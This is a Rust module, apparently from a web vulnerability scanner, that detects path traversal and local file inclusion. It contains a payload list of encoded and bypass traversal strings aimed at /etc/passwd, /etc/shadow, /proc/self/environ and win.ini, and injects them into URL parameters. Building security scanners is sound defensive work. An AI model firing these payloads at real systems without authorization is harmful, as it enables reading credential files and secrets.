use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Path Traversal / LFI detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: File Inclusion / Path Traversal", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for Path Traversal testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;

    // (payload, confirmation_string, description)
    let traversal_payloads: Vec<(&str, &str, &str)> = vec![
        // Linux
        ("../../../../etc/passwd", "root:", "Basic LFI"),
        ("....//....//....//....//etc/passwd", "root:", "Double-dot bypass"),
        ("..%2f..%2f..%2f..%2fetc%2fpasswd", "root:", "URL-encoded"),
        ("..%252f..%252f..%252f..%252fetc%252fpasswd", "root:", "Double URL-encoded"),
        ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:", "Dot URL-encoded"),
        ("../../../../etc/passwd%00", "root:", "Null byte bypass"),
        ("../../../../etc/passwd%00.png", "root:", "Null byte + extension"),
        ("/etc/passwd", "root:", "Absolute path"),
        // Windows
        ("..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini"),
        ("....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]", "Windows double-dot"),
        ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "Windows URL-encoded"),
        // Interesting files
        ("../../../../etc/shadow", "root:", "Shadow file (critical!)"),
        ("../../../../etc/hosts", "localhost", "Hosts file"),
        ("../../../../proc/self/environ", "PATH=", "Process environment"),
        ("../../../../proc/self/cmdline", "/", "Process cmdline"),
    ];

    for (param_name, _) in &params {
        for (payload, confirm, desc) in &traversal_payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, confirm).await {
                if result.reflected_in_body {
                    println!(
                        "{} CONFIRMED: Path Traversal in param '{}' — {}",
                        "[!]".red().bold(), param_name, desc
                    );
                    println!("    Payload: {}", payload);
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
